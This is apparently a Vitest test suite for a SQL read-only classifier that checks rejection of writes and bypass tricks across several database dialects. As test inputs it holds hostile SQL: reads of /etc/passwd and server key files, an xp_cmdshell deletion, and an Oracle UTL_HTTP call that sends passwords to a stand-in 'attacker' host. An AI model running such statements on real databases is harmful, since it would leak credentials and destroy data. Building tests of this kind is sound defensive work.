import { describe, it, expect } from "vitest";
import { isReadOnlySQL } from "../allowed-keywords.js";

// Multi-statement behaviour (split, then classify each statement) lives in
// src/utils/sql-access-policy.ts and is tested in sql-access-policy.test.ts.
// Everything here is single-statement classification.

describe("isReadOnlySQL", () => {
  describe("basic read-only detection", () => {
    it("should identify SELECT as read-only", () => {
      expect(isReadOnlySQL("SELECT * FROM users", "postgres")).toBe(true);
    });

    it("should identify WITH as read-only", () => {
      expect(isReadOnlySQL("WITH cte AS (SELECT 1) SELECT * FROM cte", "postgres")).toBe(true);
    });

    it("should identify EXPLAIN as read-only", () => {
      expect(isReadOnlySQL("EXPLAIN SELECT * FROM users", "postgres")).toBe(true);
    });

    it.each([
      ["INSERT", "INSERT INTO users VALUES (1)"],
      ["UPDATE", "UPDATE users SET name = 'test'"],
      ["DELETE", "DELETE FROM users"],
    ])("should identify %s as not read-only", (_keyword, sql) => {
      expect(isReadOnlySQL(sql, "postgres")).toBe(false);
    });
  });

  describe("comment handling", () => {
    it("should detect read-only after stripping multi-line comment", () => {
      const sql = "/* INSERT */ SELECT * FROM users";
      expect(isReadOnlySQL(sql, "postgres")).toBe(true);
    });

    it("should detect non-read-only after stripping comment with SELECT", () => {
      const sql = "/* SELECT */ INSERT INTO users VALUES (1)";
      expect(isReadOnlySQL(sql, "postgres")).toBe(false);
    });

    it("should handle commented-out destructive statement before real read-only", () => {
      const sql = "-- DELETE FROM users\nSELECT * FROM users";
      expect(isReadOnlySQL(sql, "postgres")).toBe(true);
    });
  });

  describe("database-specific keywords", () => {
    it("should recognize SHOW as read-only for MySQL", () => {
      expect(isReadOnlySQL("SHOW TABLES", "mysql")).toBe(true);
    });

    it("should recognize DESCRIBE as read-only for MySQL", () => {
      expect(isReadOnlySQL("DESCRIBE users", "mysql")).toBe(true);
    });

    it("should recognize PRAGMA as read-only for SQLite", () => {
      expect(isReadOnlySQL("PRAGMA table_info(users)", "sqlite")).toBe(true);
    });

    it("should not recognize SHOW as read-only for SQLite", () => {
      expect(isReadOnlySQL("SHOW TABLES", "sqlite")).toBe(false);
    });

    it("should reject standalone ANALYZE (updates statistics)", () => {
      expect(isReadOnlySQL("ANALYZE users", "postgres")).toBe(false);
      expect(isReadOnlySQL("ANALYZE", "mysql")).toBe(false);
    });

    it("should allow REPLACE() inside a WITH CTE in MySQL", () => {
      // MySQL's mutating pattern knows REPLACE INTO; a REPLACE() call must not match it.
      const sql = "WITH cte AS (SELECT REPLACE(name, 'a', 'b') AS cleaned FROM users) SELECT * FROM cte";
      expect(isReadOnlySQL(sql, "mysql")).toBe(true);
    });
  });

  describe("CTE with mutating operations", () => {
    it.each([
      ["UPDATE", "WITH updated AS (UPDATE contracts SET site_location_postcode = 'SW11' WHERE id = 1 RETURNING id) SELECT * FROM updated"],
      ["DELETE", "WITH deleted AS (DELETE FROM users WHERE id = 1 RETURNING *) SELECT * FROM deleted"],
      ["INSERT", "WITH inserted AS (INSERT INTO users (name) VALUES ('test') RETURNING *) SELECT * FROM inserted"],
      ["DROP (CTE-like construct)", "WITH x AS (SELECT 1) DROP TABLE users"],
    ])("should reject %s inside a CTE", (_keyword, sql) => {
      expect(isReadOnlySQL(sql, "postgres")).toBe(false);
    });

    it("should not be fooled by mutating keywords in string literals", () => {
      const sql = "WITH cte AS (SELECT 'UPDATE me' AS note) SELECT * FROM cte";
      expect(isReadOnlySQL(sql, "postgres")).toBe(true);
    });

    it("should allow a CTE named 'replace' in MySQL", () => {
      const sql = "WITH replace AS (SELECT 1) SELECT * FROM replace";
      expect(isReadOnlySQL(sql, "mysql")).toBe(true);
    });

    it.each(["mysql", "sqlite"] as const)(
      "should reject REPLACE INTO (non-function) inside WITH in %s",
      (dialect) => {
        const sql = "WITH cte AS (SELECT 1) REPLACE INTO users VALUES (1, 'test')";
        expect(isReadOnlySQL(sql, dialect)).toBe(false);
      }
    );

    it("should reject WITH ... SELECT INTO", () => {
      const sql = "WITH cte AS (SELECT * FROM users) SELECT * INTO new_table FROM cte";
      expect(isReadOnlySQL(sql, "postgres")).toBe(false);
    });
  });

  describe("SHOW CREATE and metadata queries", () => {
    it("should allow SHOW CREATE TABLE in MySQL", () => {
      expect(isReadOnlySQL("SHOW CREATE TABLE users", "mysql")).toBe(true);
    });

    it("should allow SHOW CREATE PROCEDURE in MariaDB", () => {
      expect(isReadOnlySQL("SHOW CREATE PROCEDURE my_proc", "mariadb")).toBe(true);
    });

    it("should allow EXPLAIN with mutating statement", () => {
      // EXPLAIN doesn't execute the statement, just shows the plan
      expect(isReadOnlySQL("EXPLAIN DELETE FROM users", "postgres")).toBe(true);
    });

    it("should reject EXPLAIN ANALYZE with DML (Postgres executes the statement)", () => {
      expect(isReadOnlySQL("EXPLAIN ANALYZE DELETE FROM users", "postgres")).toBe(false);
    });

    it("should reject EXPLAIN (ANALYZE) with DML", () => {
      expect(isReadOnlySQL("EXPLAIN (ANALYZE) DELETE FROM users", "postgres")).toBe(false);
    });

    it("should allow EXPLAIN ANALYZE with SELECT", () => {
      expect(isReadOnlySQL("EXPLAIN ANALYZE SELECT * FROM users", "postgres")).toBe(true);
    });

    it("should reject EXPLAIN ANALYZE with SELECT INTO", () => {
      expect(isReadOnlySQL("EXPLAIN ANALYZE SELECT * INTO new_table FROM users", "postgres")).toBe(false);
    });

    it("should allow EXPLAIN ANALYZE VERBOSE with SELECT", () => {
      expect(isReadOnlySQL("EXPLAIN ANALYZE VERBOSE SELECT * FROM users", "postgres")).toBe(true);
    });

    it("should reject EXPLAIN ANALYZE VERBOSE with DML", () => {
      expect(isReadOnlySQL("EXPLAIN ANALYZE VERBOSE DELETE FROM users", "postgres")).toBe(false);
    });

    it.each(["false", "off"])(
      "should allow EXPLAIN (ANALYZE %s) with DML (not executed)",
      (value) => {
        expect(isReadOnlySQL(`EXPLAIN (ANALYZE ${value}) DELETE FROM users`, "postgres")).toBe(true);
      }
    );
  });

  describe("SELECT INTO", () => {
    it.each([
      ["SELECT INTO (Postgres table creation)", "SELECT * INTO new_table FROM users", "postgres"],
      ["SELECT INTO OUTFILE (MySQL)", "SELECT * INTO OUTFILE '/tmp/data.csv' FROM users", "mysql"],
      ["SELECT INTO with WHERE clause", "SELECT id, name INTO backup_table FROM users WHERE active = true", "sqlserver"],
    ] as const)("should reject %s", (_label, sql, dialect) => {
      expect(isReadOnlySQL(sql, dialect)).toBe(false);
    });
  });

  describe("Oracle keywords", () => {
    it("allows SELECT, WITH and EXPLAIN [PLAN FOR]", () => {
      expect(isReadOnlySQL("SELECT * FROM dual", "oracle")).toBe(true);
      expect(isReadOnlySQL("WITH x AS (SELECT 1 FROM dual) SELECT * FROM x", "oracle")).toBe(true);
      expect(isReadOnlySQL("EXPLAIN PLAN FOR SELECT * FROM users", "oracle")).toBe(true);
    });

    it("denies PL/SQL blocks and Oracle-specific writes", () => {
      expect(isReadOnlySQL("BEGIN DELETE FROM users; END;", "oracle")).toBe(false);
      expect(isReadOnlySQL("DECLARE n NUMBER; BEGIN NULL; END;", "oracle")).toBe(false);
      expect(isReadOnlySQL("MERGE INTO t USING s ON (t.id = s.id) WHEN MATCHED THEN UPDATE SET t.x = 1", "oracle")).toBe(false);
      expect(isReadOnlySQL("CALL my_proc()", "oracle")).toBe(false);
    });

    it("does not let a q-quoted literal hide a write inside a CTE", () => {
      // The literal's body contains a single quote, so an ANSI scanner would
      // end the string early and expose `DELETE` as plain SQL.
      expect(isReadOnlySQL("WITH x AS (SELECT q'[it's]' AS s FROM dual) SELECT * FROM x", "oracle")).toBe(true);
      expect(isReadOnlySQL("WITH x AS (DELETE FROM t) SELECT q'[x]' FROM dual", "oracle")).toBe(false);
    });
  });

  describe("SQL Server keywords", () => {
    it("should allow EXPLAIN (translated to SHOWPLAN_XML by the connector)", () => {
      expect(isReadOnlySQL("EXPLAIN SELECT * FROM users", "sqlserver")).toBe(true);
    });

    it("should reject SHOWPLAN (not a real T-SQL statement)", () => {
      expect(isReadOnlySQL("SHOWPLAN SELECT * FROM users", "sqlserver")).toBe(false);
    });

    it("should reject bare SET SHOWPLAN_XML (session-scoped, handled via EXPLAIN)", () => {
      expect(isReadOnlySQL("SET SHOWPLAN_XML ON", "sqlserver")).toBe(false);
    });
  });

  describe("SQL Server dynamic SQL bypass prevention", () => {
    it.each([
      ["EXEC", "EXEC('DELETE FROM users')"],
      ["EXECUTE", "EXECUTE('DELETE FROM users')"],
      ["EXEC sp_executesql", "EXEC sp_executesql N'DELETE FROM users'"],
    ])("should reject %s as a standalone statement", (_label, sql) => {
      expect(isReadOnlySQL(sql, "sqlserver")).toBe(false);
    });

    it.each([
      ["EXEC", "WITH cte AS (SELECT 1) EXEC('DELETE FROM users')"],
      ["EXECUTE", "WITH cte AS (SELECT 1) EXECUTE('DELETE FROM users')"],
      ["implicit sp_executesql (no EXEC prefix)", "WITH cte AS (SELECT 1) sp_executesql N'DELETE FROM users'"],
      ["xp_cmdshell", "WITH cte AS (SELECT 1) xp_cmdshell 'del *.*'"],
    ])("should reject %s inside a CTE", (_label, sql) => {
      expect(isReadOnlySQL(sql, "sqlserver")).toBe(false);
    });

    it("should not reject EXEC/EXECUTE inside string literals", () => {
      expect(isReadOnlySQL("SELECT * FROM users WHERE name = 'EXEC is a keyword'", "sqlserver")).toBe(true);
    });
  });

  describe("SQL Server pass-through data source bypass prevention", () => {
    // The call-position rejection of OPENQUERY/OPENROWSET/OPENDATASOURCE is
    // covered by the escape-hatch table below; these pin the non-call forms.
    it("should not reject identifiers that merely start with a pass-through name", () => {
      expect(isReadOnlySQL("SELECT openquery_audit FROM logs", "sqlserver")).toBe(true);
    });

    it("should not reject a bare column named openquery (no call syntax)", () => {
      expect(isReadOnlySQL("SELECT openquery FROM logs", "sqlserver")).toBe(true);
    });
  });

  describe("edge cases", () => {
    it("should treat empty SQL after comment stripping as not read-only", () => {
      expect(isReadOnlySQL("-- just a comment", "postgres")).toBe(false);
    });

    it("should be case-insensitive", () => {
      expect(isReadOnlySQL("select * from users", "postgres")).toBe(true);
      expect(isReadOnlySQL("SELECT * FROM users", "postgres")).toBe(true);
    });
  });

  describe("MySQL conditional comment bypass prevention", () => {
    // The scanner's handling of executable comments is pinned in
    // sql-parser.test.ts; these pin the classifier's verdict on them.
    it.each([
      ["mysql", "/*!50000 DELETE FROM users WHERE 1=1 */"],
      ["mariadb", "/*M! DELETE FROM users */"],
    ] as const)("should reject %s executable comment containing DELETE: %s", (dialect, sql) => {
      expect(isReadOnlySQL(sql, dialect)).toBe(false);
    });

    it("should reject even SELECT inside MySQL conditional comment (safe default)", () => {
      // Conditional comment syntax is preserved as plain text, so the first
      // word includes the /*! prefix — safer to deny than to parse the body.
      expect(isReadOnlySQL("/*!50000 SELECT 1 */", "mysql")).toBe(false);
    });

    it("should still strip regular comments for MySQL", () => {
      expect(isReadOnlySQL("/* comment */ SELECT 1", "mysql")).toBe(true);
    });
  });

  describe("SQLite PRAGMA write bypass prevention", () => {
    it("should allow query-form introspection pragmas", () => {
      expect(isReadOnlySQL("PRAGMA user_version", "sqlite")).toBe(true);
      expect(isReadOnlySQL("PRAGMA journal_mode", "sqlite")).toBe(true);
    });

    it.each([
      ["writing the database header", "PRAGMA user_version = 1337"],
      ["changing durable state", "PRAGMA journal_mode = WAL"],
      ["disabling the read-only backstop", "PRAGMA query_only = OFF"],
      ["without surrounding spaces", "PRAGMA user_version=1"],
    ])("should reject assignment-form pragma %s", (_label, sql) => {
      expect(isReadOnlySQL(sql, "sqlite")).toBe(false);
    });

    it.each([
      ["writing the database header", "PRAGMA user_version(1337)"],
      ["changing durable state", "PRAGMA journal_mode(wal)"],
      ["disabling the read-only backstop", "PRAGMA query_only(0)"],
    ])("should reject the parenthesized setter form (equivalent to '= value') %s", (_label, sql) => {
      // SQLite accepts `PRAGMA name(value)` as an alias for `PRAGMA name = value`.
      expect(isReadOnlySQL(sql, "sqlite")).toBe(false);
    });

    it("should still allow introspection pragmas that take a name argument", () => {
      expect(isReadOnlySQL("PRAGMA table_info(users)", "sqlite")).toBe(true);
      expect(isReadOnlySQL("PRAGMA index_list(users)", "sqlite")).toBe(true);
      expect(isReadOnlySQL("PRAGMA foreign_key_list(orders)", "sqlite")).toBe(true);
    });
  });

  describe("escape-hatch function bypass prevention (issue #377)", () => {
    // Functions callable from a plain SELECT that read the server filesystem or
    // take server-wide locks — a read-only transaction does not contain them.
    it.each([
      ["mysql", "SELECT LOAD_FILE('/etc/passwd')"],
      ["mysql", "SELECT get_lock('x', 10)"],
      ["mysql", "SELECT RELEASE_LOCK('x')"],
      ["mysql", "SELECT RELEASE_ALL_LOCKS()"],
      ["mariadb", "SELECT LOAD_FILE('/etc/passwd')"],
      ["mariadb", "SELECT get_lock('x', 10)"],
      ["postgres", "SELECT pg_read_file('/etc/passwd')"],
      ["postgres", "SELECT pg_read_binary_file('server.key')"],
      ["postgres", "SELECT pg_ls_dir('/var/lib/postgresql')"],
      // set_config is SET in function form; the session-scoped variant undoes
      // the statement_timeout / search_path applied at connect (issue #448).
      ["postgres", "SELECT set_config('statement_timeout', '0', false)"],
      ["postgres", "SELECT pg_catalog.set_config('search_path', 'pg_catalog,public', false)"],
      // SQL Server pass-through sources share the same call-position guard:
      // OPENQUERY's payload runs on the remote server, OPENROWSET(BULK) reads
      // server-side files, OPENDATASOURCE opens ad-hoc connections.
      ["sqlserver", "SELECT * FROM OPENQUERY(lnk, 'DELETE FROM customers')"],
      ["sqlserver", "SELECT * FROM OPENROWSET(BULK N'C:\\secrets\\config.ini', SINGLE_CLOB) AS x"],
      ["sqlserver", "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Server=evil;Trusted_Connection=yes').db.dbo.t"],
      ["sqlserver", "WITH cte AS (SELECT * FROM OPENQUERY(srv, 'DROP TABLE t')) SELECT * FROM cte"],
      // Oracle packages reachable from a SELECT: network/filesystem access
      // and arbitrary code execution, matched on the package prefix.
      ["oracle", "SELECT UTL_HTTP.REQUEST('http://attacker/' || (SELECT password FROM t)) FROM dual"],
      ["oracle", "SELECT utl_inaddr.get_host_address('x') FROM dual"],
      ["oracle", "SELECT DBMS_XSLPROCESSOR.READ2CLOB('DIR', 'passwd') FROM dual"],
      ["oracle", "SELECT dbms_scheduler . create_job('x') FROM dual"],
    ] as const)("rejects %s escape-hatch call: %s", (dialect, sql) => {
      expect(isReadOnlySQL(sql, dialect)).toBe(false);
    });

    it("still allows Oracle columns or tables merely named after a package", () => {
      expect(isReadOnlySQL("SELECT utl_http FROM audit_log", "oracle")).toBe(true);
      expect(isReadOnlySQL("SELECT * FROM dbms_sql", "oracle")).toBe(true);
      // A qualified column reference is not a member call.
      expect(isReadOnlySQL("SELECT dbms_sql.foo FROM t dbms_sql", "oracle")).toBe(true);
    });

    it("rejects an escape-hatch call buried in a subquery / FROM clause", () => {
      expect(isReadOnlySQL("SELECT * FROM (SELECT LOAD_FILE('/etc/passwd') AS x) t", "mysql")).toBe(false);
      expect(isReadOnlySQL("WITH t AS (SELECT pg_read_file('x')) SELECT * FROM t", "postgres")).toBe(false);
    });

    it("still allows a column or alias named like an escape-hatch function (call position only)", () => {
      expect(isReadOnlySQL("SELECT load_file FROM documents", "mysql")).toBe(true);
      expect(isReadOnlySQL("SELECT count(*) AS get_lock FROM t", "mysql")).toBe(true);
      expect(isReadOnlySQL("SELECT pg_read_file FROM audit", "postgres")).toBe(true);
      expect(isReadOnlySQL("SELECT set_config FROM audit", "postgres")).toBe(true);
    });

    it("still allows reading settings through current_setting (issue #448)", () => {
      expect(isReadOnlySQL("SELECT current_setting('statement_timeout')", "postgres")).toBe(true);
    });

    it("does not apply another dialect's escape-hatch list", () => {
      // pg_read_file is a Postgres function; a mysql column of that name is fine.
      expect(isReadOnlySQL("SELECT pg_read_file FROM t", "mysql")).toBe(true);
      // load_file is MySQL's; a postgres column of that name is fine.
      expect(isReadOnlySQL("SELECT load_file FROM t", "postgres")).toBe(true);
      // openquery is SQL Server's; a postgres call of that name is fine.
      expect(isReadOnlySQL("SELECT * FROM openquery(a, b)", "postgres")).toBe(true);
    });
  });
});
